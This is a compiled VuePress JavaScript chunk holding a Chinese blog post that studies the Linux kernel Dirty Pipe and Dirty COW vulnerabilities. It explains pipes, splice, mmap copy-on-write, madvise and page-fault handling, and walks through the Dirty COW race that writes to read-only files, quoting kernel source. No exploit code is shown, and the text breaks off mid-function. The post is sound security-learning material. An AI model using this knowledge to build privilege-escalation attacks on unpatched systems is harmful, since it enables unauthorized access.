import{_ as n}from"./plugin-vue_export-helper-x3n3nnut.js";import{o as s,c as a,e}from"./app-GLDmhOe5.js";const p={},t=e(`<h1 id="不好看的linux内核学习-2-dirty-pipe-cow学习" tabindex="-1"><a class="header-anchor" href="#不好看的linux内核学习-2-dirty-pipe-cow学习" aria-hidden="true">#</a> 不好看的linux内核学习(2) dirty pipe/cow学习</h1><blockquote><p>参考文章:https://blog.csdn.net/jasonliuvip/article/details/22600569</p><p>https://zhuanlan.zhihu.com/p/25918300</p><p>https://blog.csdn.net/hbhgyu/article/details/106245182</p><p>mmap函数:https://blog.csdn.net/qq_41687938/article/details/119901916</p><p>脏页面:https://blog.csdn.net/shift_wwx/article/details/122497891</p><p>匿名页:https://blog.csdn.net/jasonchen_gbd/article/details/79462014</p><p>linux下的特殊文件:https://blog.csdn.net/pi9nc/article/details/18257593</p><p>反向映射机制:https://zhuanlan.zhihu.com/p/363319174</p><p>madvise函数:https://blog.csdn.net/sz66cm/article/details/139334306</p><p>dirty cow详解:https://xuanxuanblingbling.github.io/ctf/pwn/2019/11/18/race/ (巨推荐)</p><p>get_user_pages:https://zhuanlan.zhihu.com/p/579444153</p><p>缺页异常：https://www.anquanke.com/post/id/290851</p><p>pde和pte:https://blog.csdn.net/q1007729991/article/details/52723478</p><p>管道:https://zhuanlan.zhihu.com/p/470183989</p><p>Dirty pipe :https://blog.csdn.net/void_zk/article/details/125884637</p><p>Pipe_write源码分析:https://xz.aliyun.com/t/11016?time__1311=Cq0x2QD%3DqDT4l2zYGQqpxQq0I1tqWumD</p><p>linux寻址机制:https://www.cnblogs.com/binlovetech/p/17571929.html</p></blockquote><h2 id="前置知识" tabindex="-1"><a class="header-anchor" href="#前置知识" aria-hidden="true">#</a> 前置知识</h2><h3 id="管道" tabindex="-1"><a class="header-anchor" href="#管道" aria-hidden="true">#</a> 管道</h3><h4 id="使用流程" tabindex="-1"><a class="header-anchor" href="#使用流程" aria-hidden="true">#</a> 使用流程</h4><ul><li>父进程使用pipe 创建一个管道</li><li>然后fork创建一个子进程</li><li>然后继承父进程打开的fd</li></ul><h4 id="环形缓冲区-ring-buffer" tabindex="-1"><a class="header-anchor" href="#环形缓冲区-ring-buffer" aria-hidden="true">#</a> 环形缓冲区 (Ring Buffer)</h4><p>内核中,管道采用了环形缓冲区进行存储数据. 比如16个内存页构成的环形缓冲区.</p><p>管道是通过<code>pipe_inode_info</code>对象进行管理的</p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token keyword">struct</span> <span class="token class-name">pipe_inode_info</span> <span class="token punctuation">{</span>
	<span class="token keyword">struct</span> <span class="token class-name">mutex</span> mutex<span class="token punctuation">;</span>
	<span class="token comment">// 等待队列,存储正在等待的管道可读或者可写的进程</span>
	<span class="token class-name">wait_queue_head_t</span> wait<span class="token punctuation">;</span>
	<span class="token comment">// 表示没读的数据占据多少个内存页 (no read bufs)</span>
	<span class="token comment">// curbuf: current buffer 表示当前正在读取的环形缓冲区的哪个内存页中的数据</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> nrbufs<span class="token punctuation">,</span> curbuf<span class="token punctuation">,</span> buffers<span class="token punctuation">;</span>
	<span class="token comment">// 表示正在读取管道的进程数</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> readers<span class="token punctuation">;</span>
	<span class="token comment">// 表示正在写入管道的进程数</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> writers<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> files<span class="token punctuation">;</span>
	<span class="token comment">//  等待管道可写的进程数</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> waiting_writers<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> r_counter<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> w_counter<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span>tmp_page<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">fasync_struct</span> <span class="token operator">*</span>fasync_readers<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">fasync_struct</span> <span class="token operator">*</span>fasync_writers<span class="token punctuation">;</span>
	<span class="token comment">// 环形缓冲区</span>
	<span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span>bufs<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>然后bufs有十六个<code>pipe_buffer</code>对象构成</li></ul><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code>
<span class="token comment">/**
 *	struct pipe_buffer - a linux kernel pipe buffer
 *	@page: the page containing the data for the pipe buffer
 *	@offset: offset of data inside the @page
 *	@len: length of data inside the @page
 *	@ops: operations associated with this buffer. See @pipe_buf_operations.
 *	@flags: pipe buffer flags. See above.
 *	@private: private data owned by the ops.
 **/</span>
<span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token punctuation">{</span>
	<span class="token comment">// pipe_buffer所占的内存页</span>
	<span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span>page<span class="token punctuation">;</span>
	<span class="token comment">// 进程正在读取的数据在page中的偏移量</span>
	<span class="token comment">// len表示内存页拥有的未读数据的长度</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> offset<span class="token punctuation">,</span> len<span class="token punctuation">;</span>
	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">pipe_buf_operations</span> <span class="token operator">*</span>ops<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> flags<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> private<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="pde-和-pte" tabindex="-1"><a class="header-anchor" href="#pde-和-pte" aria-hidden="true">#</a> PDE 和 PTE</h3><p>PDE 是页目录表项。而 PTE是页表表项。</p><h3 id="脏页面" tabindex="-1"><a class="header-anchor" href="#脏页面" aria-hidden="true">#</a> 脏页面</h3><p>当你通过任何一种方式从磁盘读文件时(read/mmap)，内核都会给你申请一个<strong>page cache</strong>来缓存硬盘上的内容</p><p>linux一般修改的文件数据并不会马上同步到磁盘，会缓存在内存的page cache中 我们把这种和磁盘数据不一致的页称为脏页 然后linux会标记这种内存页为<code>dirty</code></p><h3 id="splice函数" tabindex="-1"><a class="header-anchor" href="#splice函数" aria-hidden="true">#</a> splice函数</h3><p><strong>splice</strong> 用于在两个文件描述符之间移动数据， 也是零拷贝（sendfile）splice其实一般用于管道的读取或者输出,从管道里面读取数据或者将数据放入管道里面 也就是fn_in到fd_outx</p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h&gt;</span></span>
<span class="token class-name">ssize_t</span> <span class="token function">splice</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd_in<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span>off_in<span class="token punctuation">,</span> <span class="token keyword">int</span> fd_out<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span>off_out<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>Fd_in参数是待输入描述符</p></li><li><p>Off_in表示从输入的数据流何处开始读取</p></li><li><p>Off_out 也就是表示从输出数据流何处开始读取</p></li><li><p>len表示移动数据的长度</p></li><li><p>flags参数表示数据移动的方式</p><ul><li><p><code>SPLICE_F_NONBLOCK</code> 其实重点在后面的noneblock 也就是splice操作不堵塞</p></li><li><p><code>SPLICE_F_MORE</code> 告诉内核下一个splice调用会有更多的数据穿入</p></li><li><p><code>SPLICE_F_MOVE</code>如果输出是文件，那么就会让kernel尝试从输入管道的缓冲区直接将数据读入输出地址空间,这个过程无任何数据拷贝发生</p></li></ul></li><li><p>失败返回值为-1</p></li></ul><h4 id="调用链" tabindex="-1"><a class="header-anchor" href="#调用链" aria-hidden="true">#</a> 调用链</h4><p>最终文件与管道间的分流发生在 <code>do_splice()</code> 函数：</p><ul><li>从管道读取到管道，调用 <code>splice_pipe_to_pipe()</code></li><li>从文件读取到管道，调用 <code>splice_file_to_pipe()</code></li><li>从管道读取到文件，调用 <code>do_splice_from()</code></li></ul><p>然后调用splice_file_to_pipe的时候会调用do_splice_to()</p><p>然后do_splice_to()调用<code>splice_read</code> 指针也就是generic_file_splice_read</p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token function">ext4_file_read_iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token function">generic_file_read_iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token function">filemap_read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token function">filemap_get_pages</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 获取到文件对应映射的页面集</span>
            <span class="token function">copy_page_to_iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 进行页面拷贝（单位为单个页面）</span>
                <span class="token function">__copy_page_to_iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                    <span class="token function">copy_page_to_iter_pipe</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// 我们是管道，所以走入该分</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>最终实现copy_page_to_iter_pipe函数中,即是漏洞所在位置</li></ul><h3 id="proc-self-mem" tabindex="-1"><a class="header-anchor" href="#proc-self-mem" aria-hidden="true">#</a> /proc/self/mem</h3><blockquote><p>/proc/self算是一个链接,也就是进程可以通过这个链接获取到当前进程的信息 等效成/proc/pid</p></blockquote><p><code>Proc</code>用户可以用于拿来查询linux kernel相关的信息,文件流访问进程的信息</p><ul><li><p>/proc/pid/cmdline 开始进程的命令</p></li><li><p>/proc/pid/cwd 也就是进程的工作目录的链接</p></li><li><p>/proc/pid/environ 进程可用环境变量信息</p></li><li><p>/proc/pid/fd 也就是进程打开的所有文件链接</p></li><li><p>/proc/pid/mem 包含了进程在内存的内容</p><ul><li>可以通过读写这个文件来实现直接读写虚拟内存空间 无视内存映射的权限设置</li></ul></li><li><p>/proc/pid/stat (status 包含了进程的状态信息</p></li><li><p>/proc/pid/statm (status memory)包含了进程的内存使用信息</p></li></ul><h3 id="cow" tabindex="-1"><a class="header-anchor" href="#cow" aria-hidden="true">#</a> COW</h3><p>主要执行三个重要步骤:</p><ul><li>制作映射内存的副本</li><li>更新页表,让虚拟内存重定位到新创建的物理内存内</li><li>写入内存</li></ul><p>一般操作的时候，我们需要保证操作是原子性的,否则就容易被条件竞争，这也就是dirty cow的漏洞成因</p><h3 id="mmap" tabindex="-1"><a class="header-anchor" href="#mmap" aria-hidden="true">#</a> mmap</h3><blockquote><p>参考文章:https://blog.csdn.net/qq_41687938/article/details/119901916</p><p>详细解释https://segmentfault.com/a/1190000044229036</p><p>linux内核使用vm_area_struct结构来表示一个独立的虚拟内存区域 因此一个进程使用多个vm_area_struct结构来分别表示不同类型的虚拟内存区域 比如一个vm_area_struct结构体就代表了text段一样 vm_area_struct主要是包含了一个区域的<strong>起始</strong> 和<strong>结束</strong> 并且包含<strong>vm_ops</strong>指针可以引用所有针对这个区域可以使用的系统调用函数</p></blockquote><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>start<span class="token punctuation">,</span> <span class="token class-name">size_t</span> length<span class="token punctuation">,</span> <span class="token keyword">int</span> prot<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">,</span> <span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token class-name">off_t</span> offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li><p>Start, length无需多言</p></li><li><p>prot 表示映射区域的保护模式</p><ul><li><p>PROT_EXEC 可执行</p></li><li><p>PROT_READ 可读</p></li><li><p>PROT_WRITE 可写</p></li><li><p>PROT_NONE 不能存取</p></li></ul></li><li><p>Flags 表示映射区域的各种特性,</p><ul><li>MAP_FIXED start参数所指地址无法成功建立映射的时候,直接放弃映射,并且不对地址做修正</li><li>MAP_SHARED 对映射区的写入操作会复制回文件内,而且允许其他映射文件的进程共享</li><li>MAP_PRIVATE 对映射区域的写入操作会产生一个映射文件的复制,即私人<strong>cow</strong> 因为会额外copy一个新的内存页所以任何修改都不会写回原本的文件内容(不知道会不会)</li><li>MAP_ANONYMOUS 建立匿名映射,此时回直接忽略fd,不涉及文件,而且也会和其他进程进行共享</li><li>MAP_DENYWRITE(deny write) 只允许对映射区域进行写入</li><li>MAP_LOCAKED 将映射区域锁定住,表示不会产生swap（置换）</li></ul></li><li><p>Fd 也就是要映射到内存中的文件描述符</p><ul><li>如果是匿名内存映射,就要设置<code>MAP_ANONYMOUS</code> flags参数 然后将fd设置为-1</li><li>如果有些系统不支持匿名内存映射,可以通过fopen(&quot;/dev/zero&quot;)然后对这个的文件描述符进行映射 也是可以实现匿名内存映射的 <ul><li><code>/dev/zero</code>全是空白字符,可以利用这个创建一片干净的内存区域</li><li><code>/dev/null</code>只能往里面写入,但是读取会EOF,所以可以当作垃圾桶 比如<strong>cat flag &gt;&gt; /dev/null</strong>这样就可以把数据丢进/dev/null里面</li></ul></li></ul></li></ul><h4 id="mmap映射的文件页" tabindex="-1"><a class="header-anchor" href="#mmap映射的文件页" aria-hidden="true">#</a> mmap映射的文件页</h4><blockquote><p>参考文章:https://blog.csdn.net/shift_wwx/article/details/122497891</p><p>正反向映射:https://zhuanlan.zhihu.com/p/363319174</p></blockquote><ul><li><p>第一次访问文件页时,发生缺页后读文件页到<code>page cache</code>里面,如果是写则设置页表项为<code>dirty</code>,可以写</p></li><li><p>脏页回写的时候,会通过<strong>反向映射机制</strong>(流程较为复杂),查找映射这个页的每一个vma,设置相应进程的页表项为只读,清理脏标</p><ul><li><p><code>正向映射</code> 就是当访问<strong>虚拟地址</strong>的时候需要转化为<strong>物理地址</strong></p></li><li><p><code>反向映射</code> 在以前为了找到一个物理页面的对应页表项 需要去遍历<code>mm</code>（mm_struct 用于管理进程虚拟内存空间的全部信息）然后再遍历<code>mm</code>的<code>vma</code>(vm_area_struct 也就是各种匿名内存页的详细信息) 导致效率及其低下。 所以后面设计出来了**反向映射 比如struct ano_vma 我们匿名页面的<code>page</code>和<code>mapping</code>指向结构体</p></li></ul></li><li><p>若映射成功则返回映射区的内存起始地址，否则返回MAP_FAILED(－1)，错误原因存于errno 中。</p></li></ul><h3 id="madvise函数" tabindex="-1"><a class="header-anchor" href="#madvise函数" aria-hidden="true">#</a> madvise函数</h3><blockquote><p>参考文章:https://blog.csdn.net/sz66cm/article/details/139334306</p></blockquote><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token keyword">int</span> <span class="token function">madvise</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> length<span class="token punctuation">,</span> <span class="token keyword">int</span> advice<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>也就是向内核提建议</li><li>给addr到addr+len的内存区域的建议 <ul><li>MADV_NORMAL：默认的内存访问行为，不需要特别的优化。</li><li>MADV_RANDOM：进程将以随机顺序访问指定的内存区域。内核可以优化分页算法以适应这种访问模式。</li><li>MADV_SEQUENTIAL：进程将以顺序方式访问指定的内存区域。内核可以优化分页算法以适应这种访问模式。</li><li>MADV_WILLNEED：进程将很快访问指定的内存区域。内核会尝试预读这些页面以减少缺页异常。</li><li>MADV_DONTNEED：进程不再需要指定的内存区域。内核可以释放这些页面，但在以后访问时会重新分配。</li><li>MADV_FREE：告知内核此内存区域可以丢弃，但如果没有内存压力，则保留当前内容，直到进程再次写入。这对于短期内可能会再次使用的内存区域很有用。</li><li>MADV_REMOVE：请求将指定的内存区域中的内容丢弃，并释放相关的物理内存。</li><li>MADV_DONTFORK：在 fork() 系统调用时，不复制指定的内存区域。</li><li>MADV_DOFORK：撤销 MADV_DONTFORK 设置，使 fork() 复制该内存区域。</li><li>MADV_MERGEABLE：将内存区域标记为可合并，内核将尝试将具有相同内容的内存页面合并。</li><li>MADV_UNMERGEABLE：撤销 MADV_MERGEABLE 设置。</li></ul></li></ul><h3 id="pte内核如何通过pte管理内存的映射关系" tabindex="-1"><a class="header-anchor" href="#pte内核如何通过pte管理内存的映射关系" aria-hidden="true">#</a> PTE内核如何通过pte管理内存的映射关系</h3><blockquote><p>参考文章:https://www.cnblogs.com/binlovetech/p/17571929.html</p></blockquote><p>内核会从物理内存空间中拿出一个物理内存页来专门存储进程里的这些内存映射关系,内核会在页表中划分出来一个个大小相等的小内存块，这些小内存块我们称之为页表项 PTE（Page Table Entry）</p><p>我们一般将管理pte的页表叫做页目录也就是<strong>pde</strong>,我们通过取出虚拟地址的不同段,然后层层找到我们的pte从而找到我们的内存页面</p><h2 id="dirtycow漏洞成因" tabindex="-1"><a class="header-anchor" href="#dirtycow漏洞成因" aria-hidden="true">#</a> DirtyCOW漏洞成因</h2><h3 id="mmap-cow" tabindex="-1"><a class="header-anchor" href="#mmap-cow" aria-hidden="true">#</a> mmap cow</h3><p>前面提及过mmap再<code>MAP_PRIVATE</code>flags的时候会产生一个映射复制也就是<strong>cow</strong></p><ul><li>此时允许程序通过<code>write</code>系统调用向这块私有进程进行写入操作,但是只会改变映射内存的副本不会改变映射内存本身</li></ul><h3 id="madvise" tabindex="-1"><a class="header-anchor" href="#madvise" aria-hidden="true">#</a> madvise</h3><p>前面的madvise有个flags也就是：</p><div class="language-json line-numbers-mode" data-ext="json"><pre class="language-json"><code>MADV_DONTNEED：进程不再需要指定的内存区域。内核可以释放这些页面，但在以后访问时会重新分配。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>告知内核不再需要声明地址的内存,让内核释放内存地址的资源,并且进程的页表指向原始物理内存</li></ul><h3 id="结合" tabindex="-1"><a class="header-anchor" href="#结合" aria-hidden="true">#</a> 结合</h3><p>mmap cow的过程是：</p><ul><li>创建内存副本</li><li>进程页表指向原始物理内存的副本</li><li>向副本写入数据</li></ul><p>然后在第二步的时候如果我们恰好能执行madvise从而让副本释放掉,就会将进程的页表重新指向原始的映射内存物理块,那么再次写入数据的时候就会导致只读文件被写入数据</p><h2 id="dirtycow源码分析" tabindex="-1"><a class="header-anchor" href="#dirtycow源码分析" aria-hidden="true">#</a> DirtyCow源码分析</h2><blockquote><p>参考文章:https://www.cnblogs.com/mrliu0327/p/13456502.html</p><p>https://zhuanlan.zhihu.com/p/579444153</p><p>缺页异常：https://www.anquanke.com/post/id/290851</p></blockquote><ul><li>要写一个只读文件的内容（vma-&gt;flags只读属性）</li><li>先把文件内容读出来（pagecache）</li><li>第一次去写，页不在内存，pte entry无效</li><li>do_cow_page()函数处理，并将文件内容载入内存（回写机制）</li><li>然后复制到一个匿名内存页，属性是dirty井且RO 尝试follow_page，不成功，因为要求写（FOLL_WRITE）但是页面不可写</li><li>发生写错误缺页中断</li><li>尝试将页属性改为可写（do_wp_page），但由于vma-&gt;flags是只读，不成功</li><li>返回VM_FAULT_WRITE，之后丢掉FOLL_WRITE</li><li>再次follow_page（get_user_page中） -此时如果正常的话，返回匿名内存页，虽然是只读，但是硬写没问题</li><li>但是，此时杀过来一个madvice，把匿名内存页释放</li><li>再次follow_page失败，因为对应的内存不在了</li><li>但是要求仅仅是只读（FOLL_WRITE已经被去掉了），所以直接返回 pagecache对应的内存页，写入之后由于回写机制，会将修改返回真实文件</li><li>DONE！</li></ul><p>缺页异常处理大致流程（详细的会在后面单独写一篇blog进行记录）</p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token comment">//__do_page_fault()</span>
<span class="token comment">//    __handle_mm_fault()</span>
<span class="token comment">//        handle_pte_fault()</span>
<span class="token comment">//            do_wp_page() ==&gt; pte在主存中，写缺页</span>
<span class="token comment">//            do_fault() ==&gt; pte不在主存中，及第一次非匿名页处理流程</span>
<span class="token comment">//                do_read_fault()</span>
<span class="token comment">//                do_cow_fault() ==&gt; 写操作引起的缺页错误</span>
<span class="token comment">//                do_shared_fault()</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p><code>_do_page_fault</code>函数</p><ul><li>判断 <code>address</code> 是位于内核地址空间还是用户地址空间</li><li>位于内核地址空间： <ul><li>满足相关条件，进行 <code>vmalloc_fault</code> 处理</li></ul></li><li>位于用户地址空间： <ul><li>写错误，设置 <code>FAULT_FLAG_WRITE</code> 标志</li><li>满足条件，进行 <code>handle_mm_fault</code> 处理</li></ul></li></ul></li><li><p><code>__handle_mm_fault</code>函数</p><ul><li>分配各级页表项，并获取页表项</li><li>正常的话，最后进行 <code>handle_pte_fault</code> 缺页处理</li></ul></li><li><p><code>handle_pte_fault</code>函数</p><ul><li><p>获取页表项中的内存页</p></li><li><p>该页不在主存中</p><ul><li>如果pte页表为空 则匿名页进行<code>do_anonymous_pages</code>处理 非匿名页 进行<code>do_fault</code>函数执行</li><li>如果pte页表不为空 则从交换区将页面换回主存 从交换区换回页面到主存中 缺页写错误 对应页面不可写,就调用<code>do_wp_page</code>进行cow 可写就标脏 （可以回写）如果非缺页写错误 就更新pte页表项</li></ul></li></ul></li><li><p>调用<code>do_fault</code>时</p><ul><li>由读操作引起的缺页，则进行 <code>do_read_fault</code> 处理</li><li><strong>由写私有映射引起的缺页，则进行 <code>do_cow_fault</code> 处理</strong></li><li>其他操作引起的缺页，则进行 <code>do_shared_fault</code> 处理</li></ul></li><li><p>所以通过mmap携带\`\`MAP_PRIVATE\` flags可以触发do_cow_fault函数 (其实也就是检查vma-&gt;vm_flags &amp; VM_SHARED)</p><ul><li>分配一个新的页</li><li>更新页表项</li></ul></li></ul><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token keyword">long</span> <span class="token function">__get_user_pages</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>tsk<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token operator">*</span>mm<span class="token punctuation">,</span>
		<span class="token keyword">unsigned</span> <span class="token keyword">long</span> start<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> nr_pages<span class="token punctuation">,</span>
		<span class="token keyword">unsigned</span> <span class="token keyword">int</span> gup_flags<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span><span class="token operator">*</span>pages<span class="token punctuation">,</span>
		<span class="token keyword">struct</span> <span class="token class-name">vm_area_struct</span> <span class="token operator">*</span><span class="token operator">*</span>vmas<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>nonblocking<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>__get_user_pages</strong> 函数 能够获取用户进程调用的虚拟地址之后的物理地址 也就是当进行写入私有映射的内存页时，会经过一个COW(写时拷贝)的过程（ 即复制只读页生成一个带有写权限的新页，原始页可能是私有保护不可写的 ）</p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token keyword">long</span> <span class="token function">__get_user_pages</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>tsk<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token operator">*</span>mm<span class="token punctuation">,</span>
		<span class="token keyword">unsigned</span> <span class="token keyword">long</span> start<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> nr_pages<span class="token punctuation">,</span>
		<span class="token keyword">unsigned</span> <span class="token keyword">int</span> gup_flags<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span><span class="token operator">*</span>pages<span class="token punctuation">,</span>
		<span class="token keyword">struct</span> <span class="token class-name">vm_area_struct</span> <span class="token operator">*</span><span class="token operator">*</span>vmas<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>nonblocking<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
		<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
		page <span class="token operator">=</span> <span class="token function">follow_page_mask</span><span class="token punctuation">(</span>vma<span class="token punctuation">,</span> start<span class="token punctuation">,</span> foll_flags<span class="token punctuation">,</span> <span class="token operator">&amp;</span>page_mask<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>page<span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">int</span> ret<span class="token punctuation">;</span>
			ret <span class="token operator">=</span> <span class="token function">faultin_page</span><span class="token punctuation">(</span>tsk<span class="token punctuation">,</span> vma<span class="token punctuation">,</span> start<span class="token punctuation">,</span> <span class="token operator">&amp;</span>foll_flags<span class="token punctuation">,</span>
					nonblocking<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">switch</span> <span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>
				<span class="token keyword">goto</span> retry<span class="token punctuation">;</span>
			<span class="token keyword">case</span> <span class="token operator">-</span>EFAULT<span class="token operator">:</span>
			<span class="token keyword">case</span> <span class="token operator">-</span>ENOMEM<span class="token operator">:</span>
			<span class="token keyword">case</span> <span class="token operator">-</span>EHWPOISON<span class="token operator">:</span>
				<span class="token keyword">return</span> i <span class="token operator">?</span> i <span class="token operator">:</span> ret<span class="token punctuation">;</span>
			<span class="token keyword">case</span> <span class="token operator">-</span>EBUSY<span class="token operator">:</span>
				<span class="token keyword">return</span> i<span class="token punctuation">;</span>
			<span class="token keyword">case</span> <span class="token operator">-</span>ENOENT<span class="token operator">:</span>
				<span class="token keyword">goto</span> next_page<span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			<span class="token function">BUG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
		nr_pages <span class="token operator">-=</span> page_increm<span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>nr_pages<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> i<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>我们可以看见<code>faultin_page</code>会申请内存管理的权限</p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">faultin_page</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>tsk<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">vm_area_struct</span> <span class="token operator">*</span>vma<span class="token punctuation">,</span>
